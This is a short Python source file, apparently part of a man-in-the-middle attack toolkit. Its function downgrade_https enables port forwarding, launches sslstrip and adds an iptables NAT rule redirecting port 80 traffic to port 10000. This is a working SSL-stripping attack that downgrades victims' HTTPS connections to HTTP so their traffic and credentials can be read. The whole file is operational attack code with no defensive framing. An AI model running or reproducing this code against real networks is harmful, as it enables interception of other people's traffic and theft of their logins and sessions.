import subprocess
from utils.enable_port_fwd import enable_port_fwd


def downgrade_https():
    """
    Downgrades HTTPS
    """
    downgrade_cmd = "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"
    print("[+] Downgrading HTTPS to HTTP...")
    enable_port_fwd()
    #try:
    proc = subprocess.Popen("sslstrip", shell=True, stdout=subprocess.PIPE)
    print(proc.communicate()[0]),
    proc = subprocess.Popen(downgrade_cmd, shell=True, stdout=subprocess.PIPE)
    print(proc.communicate()[0]),